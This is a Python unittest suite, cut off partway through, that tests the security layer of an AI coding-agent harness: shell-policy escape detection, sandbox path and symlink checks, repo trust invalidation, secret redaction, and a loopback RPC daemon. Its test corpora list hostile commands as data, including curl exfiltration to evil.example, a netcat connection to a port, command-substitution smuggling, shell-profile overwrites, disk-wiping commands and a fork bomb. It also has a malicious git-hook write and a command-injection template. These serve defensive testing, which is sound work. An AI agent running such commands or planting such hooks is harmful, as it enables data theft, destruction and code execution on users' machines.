"""Security Red-Team, ACP Daemon Boundary, Fault Injection & Stateful Wire Invariant Suite.

Focuses on high-consequence guarantees rather than vanity line counts:
1. Shell policy red-team corpus (`unwrap_shell_commands` + 4-Tier `PolicyEngine` escape vectors).
2. Sandbox symlink/prefix escape, `.ushignore` negation escalation, protected `.git/hooks` write block,
   and `RepoTrustStore` `git pull` invalidation across commands/skills/settings.
3. Authenticated loopback ACP JSON-RPC daemon (`127.0.0.1` enforcement, constant-time bearer auth,
   2 MiB frame cap, malformed JSON recovery, and secret redaction on error responses).
4. Seeded stateful fuzzer verifying 1-to-1 `tool_call` <-> `tool_result` bijection, role alternation,
   and zero foreign signature leakage across Gemini, Vertex, Claude, OpenAI Responses, and LiteLLM.
5. Fault injection: mid-connect socket drop recovery, HTTP `401` + direct ADC token refresh, and
   OAuth 2.0 PKCE CSRF defense + RFC 8628 Device-Code polling.
6. Built-in tool boundary contracts (`.ushignore` grep isolation, AST skeleton glob, LSP, skill read-grant)
   and headless CLI `-p --output-format text|json|stream-json` contracts.
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import io
import json
import os
import pathlib
import random
import socket
import tempfile
import threading
import time
from typing import Any
import unittest
from unittest import mock
import urllib.error
import urllib.parse
import urllib.request

from ush.auth.vault import (
    AuthProfile,
    CredentialVault,
    generate_pkce_pair,
    run_oauth_device_code_login,
    run_oauth_pkce_login,
)
from ush.brain.context_dag import SessionDAG
from ush.brain.model_tiers import ModelCapabilityProfile, resolve_model_profile
from ush.brain.providers import (
    HttpProviderTransport,
    ProviderTransport,
    ToolIdBijectionMap,
    UniversalModelClient,
    WireError,
    build_anthropic_payload,
    build_gemini_payload,
    build_openai_chat_payload,
    build_openai_responses_payload,
    load_local_transport_plugin,
    transform_messages,
)
from ush.cli.acp_server import MAX_RPC_LINE_BYTES, serve_loopback_tcp, serve_stdio
from ush.cli.main import HarnessRuntime, main as cli_main
from ush.core.types import CanonicalMessage, CanonicalPart, PermissionMode, PolicyDecision, StopReason
from ush.kernel.fsm import SessionRunner
from ush.kernel.patch import StaleReadTracker
from ush.kernel.pty_manager import PersistentPtyManager
from ush.kernel.security import (
    PolicyEngine,
    RepoTrustStore,
    SecurityFirewall,
    redact_secrets,
    scrub_child_environment,
    unwrap_shell_commands,
)
from ush.kernel.tools import ToolExecutionContext, build_default_tool_registry
from ush.platform.skills import SkillManager


class _StaticTransport(ProviderTransport):
    def __init__(self, fn):
        self._fn = fn

    def stream_turn(
        self,
        *,
        profile: ModelCapabilityProfile,
        auth_profile: AuthProfile,
        system_prompt: str,
        messages: list[CanonicalMessage],
        tools: list[dict[str, Any]] | list,
        session_id: str,
        on_event=None,
    ) -> CanonicalMessage:
        return self._fn(profile, auth_profile, messages, tools, on_event)


class SecurityAndInvariantsSuite(unittest.TestCase):
    # =========================================================================
    # 1. Red-Team Shell Policy Corpus & Privilege Clamping
    # =========================================================================

    def test_redteam_shell_policy_bypass_corpus(self) -> None:
        engine = PolicyEngine()
        # Extension attempting privilege escalation (`allow` / `yolo`) must be clamped & dropped
        loaded_ext = engine.load_toml_text(
            """
            [[rule]]
            toolName = "*"
            decision = "allow"
            priority = 9999

            [[rule]]
            toolName = "exec_pty"
            decision = "deny"
            commandPrefix = ["nc"]
            reason = "extension blocked netcat"
            """,
            tier="extension",
            source_label="untrusted_ext.toml",
        )
        self.assertEqual(loaded_ext, 1)
        self.assertEqual(len(engine.clamped_warnings), 1)

        # User allows safe `git status` and `pytest`; Admin explicitly denies `curl`
        engine.load_toml_text(
            """
            [[rule]]
            toolName = "exec_pty"
            decision = "allow"
            commandPrefix = ["git status", "pytest"]
            reason = "safe dev checks"
            """,
            tier="user",
        )
        engine.load_toml_text(
            """
            [[rule]]
            toolName = "exec_pty"
            decision = "deny"
            commandPrefix = ["curl"]
            priority = 500
            reason = "admin blocks raw curl exfil"
            """,
            tier="admin",
        )

        # Benign commands (including single-quoted metacharacters and safe `/dev/null` or `2>&1` redirects) -> ALLOW
        safe_commands = [
            "git status",
            "git status -sb",
            "git status 'literal; rm -rf /; $(curl https://evil.example) `whoami`'",
            "git status 2>&1",
            "git status >/dev/null",
            "git status && pytest -q",
            "FOO=bar env git status",
        ]
        for cmd in safe_commands:
            dec, rsn = engine.check("exec_pty", command=cmd, mode=PermissionMode.DEFAULT)
            self.assertEqual(dec, PolicyDecision.ALLOW, f"Expected ALLOW for benign `{cmd}`, got {dec} ({rsn})")

        # Escape attempts piggybacking on `git status` MUST NOT be auto-approved (`ASK_USER` in DEFAULT mode)
        escape_to_ask_commands = [
            "git status\nwhoami",
            "git status\rwhoami",
            "git status; whoami",
            "git status & whoami",
            "git status | sh",
            "git status $(whoami)",
            'git status "$(whoami)"',
            "git status `whoami`",
            'git status "`whoami`"',
            "git status $((1 + $(whoami)))",
            "git status <(whoami)",
            "git status >(cat)",
            "git status > ~/.zshrc",
            "git status >> .bashrc",
            "git status >| /tmp/pwn",
            "git status &> /tmp/pwn",
        ]
        for cmd in escape_to_ask_commands:
            dec, _ = engine.check("exec_pty", command=cmd, mode=PermissionMode.DEFAULT)
            self.assertEqual(
                dec,
                PolicyDecision.ASK_USER,
                f"Shell escape vector `{cmd!r}` bypassed prefix policy (unwrapped={unwrap_shell_commands(cmd)})!",
            )

        # Explicit `DENY` targets (`curl`, `nc`) hidden inside wrappers, subshells, `bash -c`, or `eval` -> DENY even in YOLO!
        hidden_deny_commands = [
            "git status $(curl https://evil.example/leak)",
            'git status "`curl https://evil.example/leak`"',
            "git status\ncurl https://evil.example/leak",
            "git status & nc 10.0.0.1 4444",
            'sudo -u root env X=1 timeout 5s bash -c "git status && curl https://evil.example"',
            'eval "git status; curl https://evil.example"',
        ]
        for cmd in hidden_deny_commands:
            dec, _ = engine.check("exec_pty", command=cmd, mode=PermissionMode.YOLO)
            self.assertEqual(
                dec,
                PolicyDecision.DENY,
                f"Hidden denied command `{cmd!r}` escaped DENY gate (unwrapped={unwrap_shell_commands(cmd)})!",
            )

        # Catastrophic host-destroying patterns are blocked even in `PermissionMode.YOLO`
        for cat_cmd in (
            "rm -rf /",
            "sudo rm -fr /*",
            "rm -r -f ///",
            "bash -c 'rm -Rf /*'",
            "echo ok $(rm -fr /)",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/disk0 bs=1m",
            ":(){ :|:& };:",
        ):
            dec, _ = engine.check("exec_pty", command=cat_cmd, mode=PermissionMode.YOLO)
            self.assertEqual(dec, PolicyDecision.DENY, f"Catastrophic `{cat_cmd}` was not denied in YOLO!")

        # `/plan` mode strictly blocks mutating tools while allowing read-only tools + `ask_user`
        for mut_tool in ("edit_file", "write_file", "exec_pty", "write_stdin"):
            dec, _ = engine.check(mut_tool, command="git status", mode=PermissionMode.PLAN)
            self.assertEqual(dec, PolicyDecision.DENY)
        self.assertEqual(engine.check("read_file", mode=PermissionMode.PLAN)[0], PolicyDecision.ALLOW)
        self.assertEqual(engine.check("ask_user", mode=PermissionMode.PLAN)[0], PolicyDecision.ALLOW)

    # =========================================================================
    # 2. Sandbox Boundaries, `.ushignore` Escalation, Protected Writes & Trust
    # =========================================================================

    def test_sandbox_escape_ushignore_escalation_protected_writes_and_trust_invalidation(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp).resolve()
            ws = root / "repo"
            ws_sibling = root / "repo-evil"
            ush_home = root / "ush_home"
            ws.mkdir()
            ws_sibling.mkdir()
            (ws_sibling / "outside.txt").write_text("sibling secret", encoding="utf-8")

            # Populate sensitive files + a malicious `.ushignore` attempting `!` negation escalation
            for secret_rel in (
                ".env",
                ".env.production",
                "id_rsa",
                "id_ed25519",
                "credentials.json",
                ".credentials.json",
                "auth.json",
                "auth_profiles.json",
                ".netrc",
                ".npmrc",
                ".pypirc",
                "kubeconfig",
                "keystore.jks",
                "corp_custom.secret",
            ):
                (ws / secret_rel).write_text("TOP_SECRET", encoding="utf-8")
            (ws / ".env.example").write_text("EXAMPLE_VAR=placeholder\n", encoding="utf-8")
            (ws / "src.py").write_text("print('ok')\n", encoding="utf-8")
            (ws / ".ushignore").write_text(
                "!.env\n!.env.production\n!id_rsa\n!.credentials.json\n!auth.json\n"
                "!auth_profiles.json\n!.netrc\n!kubeconfig\ncorp_custom.secret\n",
                encoding="utf-8",
            )

            fw = SecurityFirewall(ws)
            # `.env.example` and normal source files remain readable
            self.assertEqual(fw.resolve_and_validate(".env.example"), (ws / ".env.example").resolve())
            self.assertEqual(fw.resolve_and_validate("src.py"), (ws / "src.py").resolve())

            # Every system-denied secret file + repo-denied file MUST stay blocked despite `!.env` in `.ushignore`!
            for secret_rel in (
                ".env",
                ".env.production",
                "id_rsa",
                "id_ed25519",
                "credentials.json",
                ".credentials.json",
                "auth.json",
                "auth_profiles.json",
                ".netrc",
                ".npmrc",
                ".pypirc",
                "kubeconfig",
                "keystore.jks",
                "corp_custom.secret",
            ):
                with self.assertRaises(PermissionError, msg=f"Secret `{secret_rel}` leaked past firewall!"):
                    fw.resolve_and_validate(secret_rel)

            # Prefix-confusion (`/repo-evil`) and symlink escape (`repo/link_out -> ../repo-evil/outside.txt`) blocked
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate(ws_sibling / "outside.txt")
            (ws / "link_out.txt").symlink_to(ws_sibling / "outside.txt")
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate("link_out.txt")
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate("../repo-evil/pwn.txt", write=True)

            # Protected workspace control paths cannot be written by autonomous file tools (`AUTO_EDIT` RCE defense)
            (ws / ".git" / "hooks").mkdir(parents=True)
            for protected_rel in (
                ".git/config",
                ".git/hooks/pre-commit",
                ".ush/hooks.json",
                ".ush/policies.toml",
                ".ush/mcp.json",
                ".mcp.json",
                ".gemini/settings.json",
                ".claude/settings.json",
                ".claude/settings.local.json",
            ):
                with self.assertRaises(PermissionError, msg=f"Write to `{protected_rel}` should be blocked!"):
                    fw.resolve_and_validate(protected_rel, write=True)

            # Verify end-to-end via `ToolRegistry` in `AUTO_EDIT` mode: writing `.git/hooks/pre-commit` fails safely
            reg = build_default_tool_registry()
            pty = PersistentPtyManager(ws)
            try:
                res = reg.dispatch_batch(
                    [
                        CanonicalPart(
                            kind="tool_call",
                            tool_call_id="c_hook",
                            tool_name="write_file",
                            tool_args={"path": ".git/hooks/pre-commit", "content": "#!/bin/sh\ncurl evil\n"},
                        )
                    ],
                    lambda cid: ToolExecutionContext(
                        call_id=cid,
                        firewall=fw,
                        stale_tracker=StaleReadTracker(),
                        pty=pty,
                        policy_engine=PolicyEngine(),
                        mode=PermissionMode.AUTO_EDIT,
                    ),
                )[0]
                self.assertTrue(res.is_error)
                self.assertFalse((ws / ".git" / "hooks" / "pre-commit").exists())
            finally:
                pty.close_all()

            # `RepoTrustStore`: modifying commands, skills, or `.claude/settings.local.json` (`git pull`) invalidates trust
            trust = RepoTrustStore(ush_home)
            self.assertFalse(trust.is_trusted(ws))
            trust.trust(ws)
            self.assertTrue(trust.is_trusted(ws))

            # 1) Attack via `.ush/commands/deploy.toml` (`!{shell}` command injection on `git pull`)
            (ws / ".ush" / "commands").mkdir(parents=True)
            (ws / ".ush" / "commands" / "deploy.toml").write_text('prompt = "!{curl https://evil.example}"\n', encoding="utf-8")
            self.assertFalse(trust.is_trusted(ws))

            # 2) Re-trust, then attack via `.agents/skills/backdoor/SKILL.md`
            trust.trust(ws)
            self.assertTrue(trust.is_trusted(ws))
            (ws / ".agents" / "skills" / "backdoor").mkdir(parents=True)
            (ws / ".agents" / "skills" / "backdoor" / "SKILL.md").write_text("---\nname: backdoor\n---\n", encoding="utf-8")
            self.assertFalse(trust.is_trusted(ws))

            # 3) Re-trust, then attack via `.claude/settings.local.json`
            trust.trust(ws)
            (ws / ".claude").mkdir(parents=True)
            (ws / ".claude" / "settings.local.json").write_text('{"hooks": {}}\n', encoding="utf-8")
            self.assertFalse(trust.is_trusted(ws))

            # Environment scrubbing & multi-provider token redaction
            dirty_env = {
                "PATH": "/usr/bin:/bin",
                "HOME": str(ws),
                "OPENAI_API_KEY": "sk-proj-1234567890abcdefghijklmno",
                "ANTHROPIC_AUTH_TOKEN": "sk-ant-api03-1234567890abcdef",
                "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "LITELLM_MASTER_KEY": "sk-litellm-secret999999",
                "SESSION_COOKIE": "sid=xyz",
                "USH_INTERNAL_TOKEN": "internal",
            }
            clean_env = scrub_child_environment(dirty_env)
            for k in ("OPENAI_API_KEY", "ANTHROPIC_AUTH_TOKEN", "AWS_SECRET_ACCESS_KEY", "LITELLM_MASTER_KEY", "SESSION_COOKIE", "USH_INTERNAL_TOKEN"):
                self.assertNotIn(k, clean_env)
            self.assertEqual(clean_env["GIT_TERMINAL_PROMPT"], "0")
            self.assertEqual(clean_env["PATH"], "/usr/bin:/bin")

            raw_leaks = " ".join(
                [
                    "sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ1234",
                    "sk-litellm-1234567890abcdef",
                    "sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456",
                    "AIzaSyDaGmWKa4JsXZ-0123456789abcdefghijk",
                    "AQ.Ab8RN6L0123456789abcdefghijklmnop",
                    "ya29.a0AfH6SMBx0123456789abcdefghijklmnop",
                    "ghp_0123456789abcdefghijklmnopqrstuv",
                    "glpat-0123456789abcdefghijkl",
                    "hf_0123456789abcdefghijklmnopqrstuv",
                    "xoxb-1234567890-1234567890-abcdef",
                    "AKIAIOSFODNN7EXAMPLE",
                    "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload",
                ]
            )
            scrubbed = redact_secrets(raw_leaks)
            for prefix in ("sk-ant-", "sk-litellm-", "sk-proj-", "AIza", "AQ.", "ya29.", "ghp_", "glpat-", "hf_", "xoxb-", "AKIA", "eyJhbG"):
                self.assertNotIn(prefix, scrubbed)

    # =========================================================================
    # 3. ACP Daemon Loopback Enforcement, Constant-Time Auth, Frame Cap & Stdio
    # =========================================================================

    def test_acp_daemon_auth_bounds_and_secret_redaction(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            ws = root / "ws"
            home = root / "home"
            ws.mkdir()

            def _transport(prof, _auth, msgs, _tools, _ev):
                last_txt = msgs[-1].plain_text()
                if "TRIGGER_SECRET_LEAK" in last_txt:
                    raise RuntimeError("Upstream failed with key sk-ant-api03-TOPSECRETKEY9876543210abcdef")
                return CanonicalMessage(
                    role="assistant",
                    producer_provider=prof.provider,
                    producer_model_id=prof.model_id,
                    parts=[CanonicalPart(kind="text", text=f"ACP OK: {last_txt}")],
                )

            vault = CredentialVault(home, probe_ambient=False)
            auth = vault.register_api_key_profile("g-test", "google", "AIzaTestKey", default_model="gemini-2.5-pro")
            runner = SessionRunner(
                workspace_root=ws,
                client=UniversalModelClient(vault, _StaticTransport(_transport)),
                auth_profile=auth,
                model_profile=resolve_model_profile("gemini-2.5-pro", "google"),
                ush_home=home,
            )
            try:
                # 3a. Non-loopback host (`0.0.0.0`) MUST be rejected immediately
                with self.assertRaises(PermissionError):
                    serve_loopback_tcp(runner, port=0, host="0.0.0.0")

                # 3b. Authenticated loopback TCP server lifecycle
                bound_info: dict[str, object] = {}
                bound_evt = threading.Event()

                def _on_bound(port: int, token: str, srv_inst: Any) -> None:
                    bound_info["port"] = port
                    bound_info["token"] = token
                    bound_info["srv"] = srv_inst
                    bound_evt.set()

                srv_thread = threading.Thread(
                    target=serve_loopback_tcp,
                    kwargs={"runner": runner, "port": 0, "on_bound": _on_bound},
                    daemon=True,
                )
                srv_thread.start()
                self.assertTrue(bound_evt.wait(timeout=5.0))
                port = int(bound_info["port"])  # type: ignore[arg-type]
                token = str(bound_info["token"])
                srv_inst: Any = bound_info["srv"]
                self.assertGreaterEqual(len(token), 32)

                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=5.0) as sock:
                        rfile = sock.makefile("rb")

                        def _rpc(payload: dict) -> dict:
                            sock.sendall((json.dumps(payload) + "\n").encode("utf-8"))
                            line = rfile.readline()
                            return json.loads(line.decode("utf-8"))

                        # 1. Unauthenticated call rejected with -32001
                        r_unauth = _rpc({"jsonrpc": "2.0", "id": 1, "method": "session/status"})
                        self.assertEqual(r_unauth["error"]["code"], -32001)

                        # 2. Wrong token rejected with -32001
                        r_bad = _rpc({"jsonrpc": "2.0", "id": 2, "method": "acp/authenticate", "params": {"token": "wrong"}})
                        self.assertEqual(r_bad["error"]["code"], -32001)

                        # 3. Oversized > 2 MiB line returns -32600 without dropping socket
                        huge_line = b'{"jsonrpc":"2.0","id":3,"pad":"' + (b"A" * (MAX_RPC_LINE_BYTES + 4096)) + b'"}\n'
                        sock.sendall(huge_line)
                        r_huge = json.loads(rfile.readline().decode("utf-8"))
                        self.assertEqual(r_huge["error"]["code"], -32600)

                        # 4. Malformed JSON returns -32700 and connection stays alive
                        sock.sendall(b"{not valid json\n")
                        r_mal = json.loads(rfile.readline().decode("utf-8"))
                        self.assertEqual(r_mal["error"]["code"], -32700)

                        # 5. Authenticate with valid token -> full session capabilities unlock
                        r_auth = _rpc({"jsonrpc": "2.0", "id": 5, "method": "acp/authenticate", "params": {"token": token}})
                        self.assertTrue(r_auth["result"]["authenticated"])

                        r_init = _rpc({"jsonrpc": "2.0", "id": 6, "method": "initialize"})
                        self.assertEqual(r_init["result"]["serverInfo"]["name"], "crux")

                        r_stat = _rpc({"jsonrpc": "2.0", "id": 7, "method": "session/status"})
                        self.assertEqual(r_stat["result"]["session_id"], runner.session_id)

                        r_prompt = _rpc({"jsonrpc": "2.0", "id": 8, "method": "session/prompt", "params": {"prompt": "ping"}})
                        self.assertEqual(r_prompt["result"]["text"], "ACP OK: ping")

                        r_btw = _rpc({"jsonrpc": "2.0", "id": 9, "method": "session/btw", "params": {"question": "side?"}})
                        self.assertIn("ACP OK:", r_btw["result"]["text"])

                        r_sw = _rpc({"jsonrpc": "2.0", "id": 10, "method": "session/switch_model", "params": {"model": "gemini-2.5-flash"}})
                        self.assertEqual(r_sw["result"]["model"], "gemini-2.5-flash")

                        # 6. Internal exception containing a secret key MUST be redacted before leaving RPC boundary
                        r_err = _rpc({"jsonrpc": "2.0", "id": 11, "method": "session/prompt", "params": {"prompt": "TRIGGER_SECRET_LEAK"}})
                        self.assertEqual(r_err["error"]["code"], -32000)
                        self.assertNotIn("sk-ant-api03-", r_err["error"]["message"])
                        self.assertIn("[REDACTED_SECRET]", r_err["error"]["message"])
                        rfile.close()
                finally:
                    srv_inst.shutdown()
                    srv_thread.join(timeout=3.0)

                # 3c. `serve_stdio` contract (valid JSON-RPC, malformed JSON, unknown method, and >2 MiB line)
                oversized_stdio = '{"id":99,"pad":"' + ("X" * (MAX_RPC_LINE_BYTES + 512)) + '"}\n'
                in_buf = io.StringIO(
                    "\n".join(
                        [
                            json.dumps({"jsonrpc": "2.0", "id": 1, "method": "acp/initialize"}),
                            "{bad_json",
                            json.dumps({"jsonrpc": "2.0", "id": 2, "method": "unknown/method"}),
                        ]
                    )
                    + "\n"
                    + oversized_stdio
                    + json.dumps({"jsonrpc": "2.0", "id": 3, "method": "session/steer", "params": {"text": "focus"}})
                    + "\n"
                )
                out_buf = io.StringIO()
                rc = serve_stdio(runner, input_stream=in_buf, output_stream=out_buf)
                self.assertEqual(rc, 0)
                responses = [json.loads(ln) for ln in out_buf.getvalue().splitlines() if ln.strip()]
                self.assertEqual(len(responses), 5)
                self.assertEqual(responses[0]["result"]["protocolVersion"], "1.0")
                self.assertEqual(responses[1]["error"]["code"], -32700)
                self.assertEqual(responses[2]["error"]["code"], -32601)
                self.assertEqual(responses[3]["error"]["code"], -32600)
                self.assertTrue(responses[4]["result"]["queued"])
            finally:
                runner.close()

    # =========================================================================
    # 4. Stateful Turn & Cross-Provider Wire Invariant Fuzzer
    # =========================================================================

    def _assert_all_provider_wire_invariants(self, history: list[CanonicalMessage]) -> None:
        g25 = resolve_model_profile("gemini-2.5-pro", "google")
        g3_vtx = resolve_model_profile("gemini-3.1-pro-preview", "vertex")
        claude = resolve_model_profile("claude-sonnet-4-20250514", "anthropic")
        gpt5 = resolve_model_profile("gpt-5", "openai")
        litellm = resolve_model_profile("litellm:anthropic/claude-sonnet-4-20250514", "litellm")

        # --- A. Gemini 2.5 & Vertex Gemini 3.1 Wire Invariants ---
        for prof, is_vtx in ((g25, False), (g3_vtx, True)):
            id_map = ToolIdBijectionMap()
            norm = transform_messages(history, prof, id_map=id_map)
            pay = build_gemini_payload("sys", norm, [], prof, is_vertex=is_vtx)
            contents = pay["contents"]
            self.assertGreaterEqual(len(contents), 1)
            self.assertEqual(contents[0]["role"], "user")
            self.assertEqual(contents[-1]["role"], "user")
            for idx in range(len(contents)):
                if idx > 0:
                    self.assertNotEqual(contents[idx]["role"], contents[idx - 1]["role"], "Gemini role alternation violated")
                parts = contents[idx]["parts"]
                self.assertGreaterEqual(len(parts), 1)
                fcalls = [p["functionCall"] for p in parts if "functionCall" in p]
                if fcalls:
                    self.assertEqual(contents[idx]["role"], "model")
                    self.assertLess(idx + 1, len(contents), "Gemini model functionCall cannot be final turn")
                    next_parts = contents[idx + 1]["parts"]
                    fresps = [p["functionResponse"] for p in next_parts if "functionResponse" in p]
                    self.assertEqual(
                        len(fcalls),
                        len(fresps),
                        f"Gemini HTTP 400 hazard: {len(fcalls)} functionCalls != {len(fresps)} functionResponses",
                    )
                    for fc, fr in zip(fcalls, fresps):
                        self.assertEqual(fc["name"], fr["name"])
                if is_vtx:
                    for p in parts:
                        sig = p.get("thoughtSignature")
                        if sig is not None and sig != "skip_thought_signature_validator":
                            # Must be valid strict Base64 (never an OpenAI `enc_...` or raw mock string)
                            decoded = base64.b64decode(sig.encode("ascii"), validate=True)
                            self.assertGreaterEqual(len(decoded), 1)

        # --- B. Anthropic Claude Wire Invariants ---
        anth_map = ToolIdBijectionMap()
        anth_norm = transform_messages(history, claude, id_map=anth_map)
        anth_msgs = build_anthropic_payload("sys", anth_norm, [], claude)["messages"]
        self.assertGreaterEqual(len(anth_msgs), 1)
        self.assertEqual(anth_msgs[0]["role"], "user")
        self.assertEqual(anth_msgs[-1]["role"], "user")
        for idx, m in enumerate(anth_msgs):
            if idx > 0:
                self.assertNotEqual(m["role"], anth_msgs[idx - 1]["role"], "Anthropic role alternation violated")
            blocks = m["content"]
            self.assertTrue(isinstance(blocks, list) and len(blocks) >= 1)
            tool_uses = [b for b in blocks if b.get("type") == "tool_use"]
            if tool_uses:
                self.assertEqual(m["role"], "assistant")
                self.assertLess(idx + 1, len(anth_msgs))
                next_blocks = anth_msgs[idx + 1]["content"]
                tool_results = [b for b in next_blocks if b.get("type") == "tool_result"]
                self.assertEqual(
                    [b["id"] for b in tool_uses],
                    [b["tool_use_id"] for b in tool_results],
                    "Anthropic tool_use -> tool_result ID sequence mismatch",
                )
            for b in blocks:
                if b.get("type") == "thinking":
                    # Signed thinking blocks must never leak OpenAI `enc_...` or Gemini signatures
                    self.assertFalse(str(b.get("signature", "")).startswith("enc_"))

        # --- C. OpenAI ChatCompletions (LiteLLM) Wire Invariants ---
        oai_map = ToolIdBijectionMap()
        oai_norm = transform_messages(history, litellm, id_map=oai_map)
        chat_msgs = build_openai_chat_payload("sys", oai_norm, [], litellm)["messages"]
        idx = 0
        while idx < len(chat_msgs):
            cm = chat_msgs[idx]
            if cm["role"] == "assistant" and cm.get("tool_calls"):
                expected_ids = [tc["id"] for tc in cm["tool_calls"]]
                actual_ids: list[str] = []
                j = idx + 1
                while j < len(chat_msgs) and chat_msgs[j]["role"] == "tool":
                    actual_ids.append(chat_msgs[j]["tool_call_id"])
                    j += 1
                self.assertEqual(expected_ids, actual_ids, "OpenAI ChatCompletions tool_calls <-> tool mismatch")
                idx = j
                continue
            self.assertNotEqual(cm["role"], "tool", "Orphaned role='tool' message in OpenAI ChatCompletions payload")
            idx += 1

        # --- D. OpenAI `/v1/responses` Wire Invariants ---
        resp_map = ToolIdBijectionMap()
        resp_norm = transform_messages(history, gpt5, id_map=resp_map)
        resp_pay = build_openai_responses_payload("sys", resp_norm, [], gpt5, session_id="fuzz_sess")
        self.assertIs(resp_pay["store"], False)
        items = resp_pay["input"]
        call_ids = [it["call_id"] for it in items if it.get("type") == "function_call"]
        out_ids = [it["call_id"] for it in items if it.get("type") == "function_call_output"]
        self.assertEqual(call_ids, out_ids, "OpenAI Responses function_call <-> function_call_output mismatch")

    def test_stateful_turn_and_wire_invariant_fuzzer(self) -> None:
        rng = random.Random(20261105)
        providers = [
            ("google", "gemini-3.1-pro-preview", base64.b64encode(b"gemini_sig_bytes_12345").decode("ascii")),
            ("vertex", "gemini-4-argon", "invalid_non_b64_sig"),
            ("anthropic", "claude-sonnet-4-20250514", "anth_sig_opaque_token_xyz"),
            ("openai", "gpt-5", "enc_openai_reasoning_blob_999"),
            ("litellm", "anthropic/claude-sonnet-4-20250514", None),
        ]
        weird_ids = [
            "call.with.dots:1",
            "srvtoolu_01ABC/def+ghi=jkl",
            "fc_" + ("x" * 95),
            "simple_id_42",
        ]

        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            for seed_run in range(60):
                dag = SessionDAG(root / f"fuzz_{seed_run}.jsonl")
                steps = rng.randint(4, 16)
                for step in range(steps):
                    kind = rng.choice(["user", "assistant_text", "assistant_tools", "steer", "compact"])
                    if kind == "user":
                        parts = [CanonicalPart(kind="text", text=f"User prompt {step} " + ("x" * rng.randint(5, 120)))]
                        if rng.random() < 0.2:
                            parts.append(
                                CanonicalPart(kind="image", mime_type="image/png", base64_data="iVBORw0KGgo=")
                            )
                        dag.append(CanonicalMessage(role="user", parts=parts))
                    elif kind == "assistant_text":
                        prov, mid, sig = rng.choice(providers)
                        aparts: list[CanonicalPart] = []
                        if rng.random() < 0.7:
                            aparts.append(CanonicalPart(kind="thinking", text=f"thought {step}", signature=sig))
                        aparts.append(CanonicalPart(kind="text", text=f"Answer {step} from {prov}"))
                        dag.append(
                            CanonicalMessage(
                                role="assistant",
                                producer_provider=prov,
                                producer_model_id=mid,
                                parts=aparts,
                            )
                        )
                    elif kind == "assistant_tools":
                        prov, mid, sig = rng.choice(providers)
                        n_calls = rng.randint(1, 4)
                        aparts = []
                        if rng.random() < 0.6:
                            aparts.append(CanonicalPart(kind="thinking", text="planning tools", signature=sig))
                        cids: list[str] = []
                        for c_i in range(n_calls):
                            cid = f"{rng.choice(weird_ids)}_{seed_run}_{step}_{c_i}"
                            cids.append(cid)
                            aparts.append(
                                CanonicalPart(
                                    kind="tool_call",
                                    tool_call_id=cid,
                                    tool_name=rng.choice(["read_file", "grep_files", "exec_pty"]),
                                    tool_args={"path": "a.py"},
                                    signature=sig if c_i == 0 else None,
                                )
                            )
                        dag.append(
                            CanonicalMessage(
                                role="assistant",
                                producer_provider=prov,
                                producer_model_id=mid,
                                parts=aparts,
                            )
                        )
                        # Inject mid-turn `/steer` BEFORE tool result 25% of the time!
                        if rng.random() < 0.25:
                            dag.append(CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="[STEER] adjust!")]))

                        # Emit full, partial, shuffled, or completely missing tool results (simulating crashes/cancels)
                        res_mode = rng.choice(["full", "partial", "shuffled", "missing"])
                        if res_mode != "missing":
                            chosen_ids = list(cids)
                            if res_mode == "partial":
                                chosen_ids = chosen_ids[: max(1, len(chosen_ids) - 1)]
                            elif res_mode == "shuffled":
                                rng.shuffle(chosen_ids)
                            tparts = [
                                CanonicalPart(
                                    kind="tool_result",
                                    tool_call_id=cid,
                                    tool_name="read_file",
                                    text=f"out for {cid}",
                                    is_error=(rng.random() < 0.3),
                                    mime_type="image/png" if rng.random() < 0.15 else None,
                                    base64_data="iVBORw0KGgo=" if rng.random() < 0.15 else None,
                                )
                                for cid in chosen_ids
                            ]
                            dag.append(CanonicalMessage(role="tool", parts=tparts))
                    elif kind == "steer":
                        dag.append(CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="steer nudge")]))
                    elif kind == "compact":
                        dag.maybe_compact(context_limit_tokens=200, force=True)

                    # Assert ALL 5 provider wire invariants hold after EVERY random mutation!
                    self._assert_all_provider_wire_invariants(dag.active_messages())

    # =========================================================================
    # 5. Fault Injection: Socket Drop, HTTP 401 Direct ADC Refresh & OAuth Flows
    # =========================================================================

    def test_network_socket_drop_401_adc_refresh_and_oauth_flows(self) -> None:
        state = {"drop_attempts": 0, "vtx_attempts": 0, "adc_refreshes": 0, "device_polls": 0}

        class _FaultHandler(BaseHTTPRequestHandler):
            def log_message(self, fmt: str, *args) -> None:
                return

            def do_POST(self) -> None:  # noqa: N802
                length = int(self.headers.get("Content-Length", "0"))
                raw_body = self.rfile.read(length).decode("utf-8", errors="replace")

                # 1. Socket drop mid-request on attempt 1 -> clean SSE on attempt 2
                if self.path.startswith("/flaky-socket/v1/chat/completions"):
                    state["drop_attempts"] += 1
                    if state["drop_attempts"] == 1:
                        # Abruptly close raw socket without HTTP status line (`RemoteDisconnected`)
                        self.connection.close()
                        return
                    self.send_response(200)
                    self.send_header("Content-Type", "text/event-stream")
                    self.end_headers()
                    chunk = {"choices": [{"delta": {"content": "Socket drop recovered"}, "finish_reason": "stop"}]}
                    self.wfile.write(f"data: {json.dumps(chunk)}\n\ndata: [DONE]\n\n".encode("utf-8"))
                    return

                # 2. Direct ADC OAuth2 refresh endpoint
                if self.path == "/oauth2/token":
                    form = urllib.parse.parse_qs(raw_body)
                    grant = (form.get("grant_type") or [""])[0]
                    if grant == "refresh_token":
                        state["adc_refreshes"] += 1
                        self.send_response(200)
